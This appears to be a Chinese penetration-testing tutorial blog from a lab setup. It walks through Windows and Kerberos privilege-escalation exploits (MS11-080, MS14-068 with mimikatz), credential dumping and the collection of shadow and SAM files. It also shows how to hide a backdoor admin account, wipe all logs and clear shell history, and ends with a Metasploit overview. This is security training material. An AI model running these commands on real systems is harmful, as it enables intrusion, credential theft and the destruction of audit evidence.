 WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p> 查看 WinXP下的文件路径</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p>
<pre><code>  C:\&gt;18176.py -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  启动任务管理器</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  结束 kevin 权限的 explorer 桌面程序</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165317715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  输入 explorer</p>
<p><img src="https://img-blog.csdnimg.cn/2019041316532377.png" alt="在这里插入图片描述"></p>
<p>  启动 system 权限的 explorer 桌面程序</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>2.WinXP 无需安装 Pyhon 的运行环境</p>
<pre><code>  # 使用 python2 的 pyinstaller 将 python 文件进行打包
  root@kali:~# apt-get install python-pip
  root@kali:~# pip install pyinstaller
  # 或者 WinXP 下，安装 python2.7
  C:\&gt;pyinstaller --onefile 18176.py
      297 INFO: Building EXE from out00-EXE.toc
      297 INFO: Appending archive to EXE C:\dist\18176.exe
      328 INFO: Building EXE from out00-EXE.toc completed successfully.
</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>  # 打开文件目录，将文件复制到目标主机
  C:\&gt;whoami
      test
  C:\&gt;net user test
      本地组成员             *Users
      全局组成员             *None
  # 查看文件位置</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>     C:\&gt;cd 111
     C:\111&gt;18176.exe -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>     C:\WINDOWS\system32&gt;whoami
         SYSTEM
     # 将自己添加为管理员组
     C:\WINDOWS\system32&gt;net localgroup administrators test /add
         命令成功完成。</code></pre><p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p>
<h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul>
<li><p>使用 win2003 搭建域控制器</p>
<ul>
<li><p>配置并连接域控制器</p>
<ul>
<li>运行 -&gt; dcpromo</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165412201.png" alt="在这里插入图片描述"></p>
</li>
</ul>
</li>
</ul>
<pre><code>     # Win2003 设置成域控制器，配置静态 IP 地址
     # Win2003 设置强密码
     C:\&gt;net user Administrator jlcssadmin2006...

     # Win7 设置 静态 IP    并将 DNS 设置为 Win2003 的IP地址
     # Win7 加入域控制器    </code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p>
<p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p>
<p>重启之后</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165438137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>修改 Win2003 中的域控制器的用户权限</p>
<ul>
<li>Win2003 -&gt; 运行 -&gt; dsa.msc</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165456477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165500666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>Win7</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165516801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>win2003</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165521164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>Win7 可以查看域控制器共享出来的文件等资源</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165527351.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>使用漏洞代码攻击域控制器</p>
<ul>
<li><p>获取攻击文件</p>
<pre><code>  # root@kali:~# searchsploit Ms14-068
      ------------------------------------------ ----------------------------------
       Exploit Title                            |  Path
                                | (/usr/share/                    exploitdb/)
      ------------------------------------------ ----------------------------------
      Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py
      ------------------------------------------ ---------------------------------
  root@kali:~# cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</code></pre></li>
<li><p>域环境下使用通用工具查看本地密码</p>
</li>
</ul>
<pre><code>  C:\fgdump&gt;PwDump.exe localhost    # 仅是本地密码
  C:\&gt;wce-universal.exe    # 结果是域控制器密码
  C:\&gt;wce-universal.exe -w
      Administrator\LAB:jlcssadmin
  C:\Win32&gt;mimikatz.exe
  mimikatz # ::
  mimikatz # privilege::debug
      Privilege &#39;20&#39; OK
  mimikatz # kerberos::list
  mimikatz # sekurlsa::logonPasswords</code></pre><ul>
<li>漏洞利用过程</li>
</ul>
<pre><code>  1. 首先在 kali 通过脚本生成一个票据文件
      # ms14-068.py -u user@lab.com -s userSID -d dc.lab.com
      -u 用户名:登录用户名
      -s userSID
      -d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替
  2. 将票据文件拷贝到 win 系统里
      # 拷贝 TGT_user1@lab.com.ccache 到windows系统
  3. 在 win 系统里使用 mimikatz.exe 完成权限的提升
      # mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit

  # 在 Win7 上使用本地用户登录
  # 查看域账号的信息
  C:\&gt;net user
      \\WIN7-VM 的用户帐户
      Administrator            Guest                    John
      user1                    user2
      命令成功完成。
  C:\Win32&gt;whoami.exe /all
      [User]     = &quot;LAB\user3&quot;  S-1-5-21-3056505427-3800332898-2304591883-1111

  # kali 报错缺少模块
  root@kali:~# python 35474.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132

  # 下载安装模块https://github.com/bidord/pykek
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<pre><code>     root@kali:~/Desktop/pykek-master# python ms14-068.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132
     Password: 
       [+] Building AS-REQ for 172.16.10.132... Done!
       [+] Sending AS-REQ to 172.16.10.132... Done!
       [+] Receiving AS-REP from 172.16.10.132... Done!
       [+] Parsing AS-REP from 172.16.10.132... Done!
       [+] Building TGS-REQ for 172.16.10.132... Done!
       [+] Sending TGS-REQ to 172.16.10.132... Done!
       [+] Receiving TGS-REP from 172.16.10.132... Done!
       [+] Parsing TGS-REP from 172.16.10.132... Done!
       [+] Creating ccache file &#39;TGT_user1@lab.com.ccache&#39;... Done        
     # 将文件拷贝到 Win7</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>     # 在 Win7 下执行
     C:\mimikatz\Win32&gt;mimikatz.exe log &quot;kerberos::ptc TGT_user3@lab.com.ccache&quot; exit
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)

     # 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket
     C:\mimikatz\Win32&gt;klist
         当前登录 ID 是 0:0x776bd
         缓存的票证: (1)
         #0&gt;     客户端: user3 @ LAB.COM
             服务器: krbtgt/LAB.COM @ LAB.COM
             Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)
             票证标志 0x50a00000 -&gt; forwardable proxiable renewable pre_authent
             开始时间: 3/4/2018 2:00:45 (本地)
             结束时间:   3/4/2018 12:00:44 (本地)
             续订时间: 3/11/2018 2:00:44 (本地)
             会话密钥类型: RSADSI RC4-HMAC(NT)
     C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$
         命令成功完成。</code></pre><h5 id="利用-CVE-2012-0056-提升-linux-权限"><a href="#利用-CVE-2012-0056-提升-linux-权限" class="headerlink" title="利用 CVE-2012-0056 提升 linux 权限"></a>利用 CVE-2012-0056 提升 linux 权限</h5><ul>
<li>是一个关于 /proc/pid/mem 的漏洞</li>
<li>要求：linux 内核必须大于2.6.39</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165547661.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>样例：使用 ubuntu11 系统</p>
<ul>
<li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">ubuntu11 官网链接（http://old-releases.ubuntu.com/releases/11.10/）</a></li>
</ul>
</li>
<li><p>在 kali 中查询</p>
<pre><code> root@kali:~# searchsploit 18411
     --------------------------- ----------------------------------
      Exploit Title             |  Path
                                | (/usr/share/exploitdb/)
     --------------------------- ----------------------------------
     Linux Kernel 2.6.39 &lt; 3.2. | exploits/linux/local/18411.c
     --------------------------- -------------------------------
 root@kali:~# cp /usr/share/exploitdb/exploits/linux/local/18411.c .
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165552374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<ul>
<li>下载了 ubuntu11，安装之后 ssh 没办法使用，文件无法导入，故无法演示 ，过程是这样的，使用 kali-1.1.0 演示一下结kali-1.1.0 已经打了这个漏洞的补丁了，故无结果。</li>
</ul>
<h3 id="提权——利用配置不当提权"><a href="#提权——利用配置不当提权" class="headerlink" title="提权——利用配置不当提权"></a>提权——利用配置不当提权</h3><ul>
<li>与漏洞提权相比更常用的方法 <ul>
<li>企业环境 </li>
<li>补丁更新的全部已经安装 </li>
<li>输入变量过滤之外更值得研发关注的安全隐患 </li>
<li>以system权限启动 </li>
<li>NTFS权限允许users修改删除 </li>
</ul>
</li>
<li>icacls<ul>
<li>icacls c:\windows*.exe /save perm /T </li>
<li>i586-mingw32msvc-gcc -o admin.exe admin.c </li>
</ul>
</li>
<li>Find<ul>
<li>find / -perm 777 -exec ls -l {} ; </li>
</ul>
</li>
<li>应用系统的配置文件 <ul>
<li>应用连接数据库的配置文件 </li>
</ul>
</li>
</ul>
<h5 id="1-NTFS权限允许-users-修改删除"><a href="#1-NTFS权限允许-users-修改删除" class="headerlink" title="1. NTFS权限允许 users 修改删除"></a>1. NTFS权限允许 users 修改删除</h5><p><img src="https://img-blog.csdnimg.cn/20190413165618902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190413165622194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li>
</ul>
<pre><code> C:\&gt;icacls boot.ini
     boot.ini BUILTIN\Power Users:(RX)
              BUILTIN\Administrators:(F)
              NT AUTHORITY\SYSTEM:(F)

     Successfully processed 1 files; Failed processing 0 files
 # 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统

 # 查询各程序的权限情况
 C:\&gt;icacls c:\windows\*.exe /save saveicacls /T
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165627275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code> BU：build user
 PU：power user
 BA：build administrator

 如果 BU 是 F 的话，则说明可以替换
 如果出现 FA；；；BU，则说明权限配置不当

 # kali 下使用 c 文件生成 winXP 下的可执行程序
 root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</code></pre><h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><pre><code>root@kali:~# ls -l
find / -perm 777 -exec ls -l {} \;</code></pre><h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><pre><code>1. 应用连接数据库的配置文件
2. 后台服务运行账号</code></pre><h3 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h3><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><pre><code># Linux
•/etc/resolv.conf
•/etc/passwd
•/etc/shadow
•whoami and who –a
•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r
•uname –a, ps aux
•dpkg -l| head

# Windows
•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r
•net view , net view /domain    # 查共享信息
•net user /domain, net user %username% /domain  # 查域信息
•net accounts, net share
•net localgroup administrators username /add
•net group &quot;Domain Controllers&quot; /domain
•net share name$=C:\ /unlimited    # 把 C盘共享出来
•net user username /active:yes /domain  # 域管理员重新启动被锁定账号
</code></pre><h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><pre><code>C:\Users\John&gt;wmic
wmic:root\cli&gt;/?
[global switches] &lt;command&gt;

有效的全局开关有:
/NAMESPACE           别名使用的名称空间路径。
/ROLE                包含此别名定义的角色路径。
/NODE                别名使用的服务器。
/IMPLEVEL            客户模拟级别。
/AUTHLEVEL           客户身份验证级别。
/LOCALE              客户应用的语言识别符。
/PRIVILEGES          启用或禁用所有特权。
/TRACE               将调试信息输出到 stderr。
/RECORD              将所有输入命令和输出写入日志。
/INTERACTIVE         设置或重设交互模式。
/FAILFAST            设置或重置 FailFast 模式。
/USER                会话期间使用的用户。
/PASSWORD            用于会话登录的密码。
/OUTPUT              为输出重新定向指定模式。
/APPEND              为输出重新定向指定模式。
/AGGREGATE           设置或重置集合模式。
/AUTHORITY           Specifies the &lt;authority type&gt; for the connection.
/?[:&lt;BRIEF|FULL&gt;]    用法信息。



•wmic nicconfig get ipaddress,macaddress
•wmic computersystem get username
•wmic netlogin get name,lastlogon
•wmic process get caption, executablepath,commandline   # 提取软件安装信息
•wmic process where name=“calc.exe&quot; call terminate  # 结束进程
•wmic os get name,servicepackmajorversion       #提取操作系统的补丁版本
•wmic product get name,version                  # 提取软件信息
•wmic product where name=“name” call uninstall /nointeractive   # 静默删除
•wmic share get /ALL                            # 提取共享文件夹
•wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where  AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;    # 开远程桌面
•wmic nteventlog get path,filename, writeable   #查看日志目录



C:\&gt;wmic nteventlog get path,filename, writeable
FileName   Path                       Writeable
appevent   \windows\system32\config\  TRUE
ntds       \windows\system32\config\  TRUE
dnsevent   \windows\system32\config\  TRUE
ntfrs      \windows\system32\config\  TRUE
secevent   \windows\system32\config\  TRUE
sysevent   \windows\system32\config\  TRUE
ThinPrint  \windows\system32\config\  TRUE
</code></pre><h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><pre><code># Linux
•/etc ；/usr/local/etc
•/etc/passwd ；/etc/shadow
•.ssh ；.gnupg 公私钥
•The e-mail and data files
•业务数据库 ；身份认证服务器数据库
•/tmp

# windows
•SAM 数据库 ； 注册表文件
•%SYSTEMROOT%\repair\SAM
•%SYSTEMROOT%\System32\config\RegBack\SAM
•业务数据库； 身份认证数据库
•临时文件目录
•UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\
</code></pre><h3 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h3><ul>
<li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li>
<li>windows 系统</li>
</ul>
<pre><code>•禁止在登陆界面显示新建账号
•REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersio\WinLogon\SpecialAccounts\UserList&quot; /v uname /T REG_DWORD /D 0
•del %WINDIR%\*.log /a/s/q/f
•History
•日志
•auth.log / secure
•btmp / wtmp
•lastlog / faillog
•其他日志和 HIDS 等


# 控制系统之后，新建账号并添加管理员组
C:\&gt;net user user4 123456 /add
命令成功完成。
C:\&gt;net localgroup administrators user4 /add
命令成功完成。
# 这样开机登录的界面会显示这个账户
# 可以通过添加注册表来隐藏
REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0
C:\&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0
操作成功结束
# 但是使用 net user 还是可以查看到这个账户


# 强制静默删除日志
C:\&gt;del %WINDIR%\*.log /a/s/q/f</code></pre><ul>
<li>Linux 系统</li>
</ul>
<pre><code>root@kali:~# history
# history 记录保存在 .bash_history
root@kali:~# ls -l .bash_history 
    -rw------- 1 root root 15418 3月   4 00:28 .bash_history
# 擦除痕迹
root@kali:~# history -c

root@kali:~# lsattr
    --------------e---- ./Downloads
    --------------e---- ./Desktop
    --------------e---- ./testDir
    --------------e---- ./Pictures
    --------------e---- ./Public
    --------------e---- ./vmware-tools-patches
    --------------e---- ./Videos
    --------------e---- ./Documents
    --------------e---- ./Music
    --------------e---- ./Templates
root@kali:~# chattr -h
    Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...

# 修改文件属性让其无法被写入数据
root@kali:~# touch 456.txt
root@kali:~# lsattr 456.txt 
    --------------e---- 456.txt
root@kali:~# ifconfig &gt; 456.txt 
root@kali:~# chattr +i 456.txt 
root@kali:~# lsattr 456.txt 
    ----i---------e---- 456.txt
root@kali:~# ifconfig &gt; 456.txt 
    -bash: 456.txt: 不允许的操作

# 修改 .bash_history，让其无法被写入，会变成只读文件
root@kali:~# chattr +i .bash_history


# 日志记录
•auth.log / secure
•btmp / wtmp
•lastlog / faillog

root@kali:~# cat /var/log/auth.log
root@kali:~# cat /var/log/wtmp
root@kali:~# lastlog
    用户名           端口     来自             最后登陆时间
    root             pts/3    172.16.10.1      日 3月  4 02:30:00 -0500 2018
    daemon                                     **从未登录过**
    bin                                        **从未登录过**
    sys                                        **从未登录过**
    sync                                       **从未登录过**
    games                                      **从未登录过**
    man                                        **从未登录过**
    lp                                         **从未登录过**
    mail                                       **从未登录过**
    news                                       **从未登录过**
    uucp                                       **从未登录过**
    proxy                                      **从未登录过**
    www-data                                   **从未登录过**
    backup                                     **从未登录过**
    list                                       **从未登录过**
    irc                                        **从未登录过**
    gnats                                      **从未登录过**
    nobody                                     **从未登录过**</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/" itemprop="url">渗透测试——拒绝服务</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:58:09+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/" itemprop="url">渗透测试——Mestasploit基本使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:52:51+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul>
<li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li>
<li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li>
<li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li>
</ul>
<h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul>
<li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p>
</li>
<li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p>
</li>
<li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p>
<ul>
<li>框架继承了渗透测试标准（PETS）标准</li>
<li>一定程度上统一了渗透测试研究的工作环境</li>
<li>新的攻击代码可以比较容易的加入框架</li>
</ul>
</li>
<li><p>开发活跃版本更新频繁</p>
<ul>
<li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li>
<li>目前分化为四个版本，社区版依然十分活跃</li>
<li>HD More说：为 Metasploit 写书是种自虐</li>
</ul>
</li>
<li><p>Metasploit 默认集成 kali linux 中</p>
</li>
<li><p>使用 postgresql 数据库存储数据</p>
<ul>
<li>早期版本需要先启动数据库再启动 msf</li>
</ul>
<p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p>
</li>
</ul>
<p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p>
<h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul>
<li>Rex<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li>
<li>编码转换（XOR、Base64、Unicode）</li>
</ul>
</li>
<li>Msf::Core<ul>
<li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li>
</ul>
</li>
<li>Msf::Base<ul>
<li>提供友好的的 API 接口，便于模块调用的库</li>
</ul>
</li>
<li>Plugin 插件<ul>
<li>连接和调用外部扩展功能和系统</li>
</ul>
</li>
<li>模块<ul>
<li>/usr/share/metasploit-framework/modules/</li>
</ul>
</li>
<li>技术功能模块（不是流程模块）<ul>
<li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
</ul>
</li>
<li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul>
<li>shellcode 或系统命令</li>
<li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li>
<li>Single：all-in-one</li>
<li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li>
<li>stages：利用 stager 建立的连接下载的后续payload</li>
<li>stager、stages 都有多种类型，适用于不同场景</li>
<li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li>
</ul>
</li>
<li>技术功能模块（不是流程模块）<ul>
<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li>
<li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li>
<li>Nops：提高 paylaod 稳定性及维持大小</li>
</ul>
</li>
</ul>
